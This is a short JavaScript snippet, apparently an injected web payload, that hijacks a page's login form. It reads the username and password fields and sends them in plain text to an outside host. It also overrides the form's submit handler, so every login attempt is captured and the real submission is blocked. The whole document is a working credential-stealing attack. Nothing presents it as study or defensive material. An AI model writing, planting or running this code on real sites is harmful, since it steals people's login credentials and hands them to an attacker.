function intercept() {
 
 var user = document.forms[0].elements[0].value;
 var pass = document.forms[0].elements[1].value;
 
 
 var xhr = new XMLHttpRequest();
 
 xhr.open("GET", "https://storage.appssec.co.uk?email="+user+"&password="+pass)
 xhr.send();
return false;
 }
 document.forms[0].onsubmit = intercept;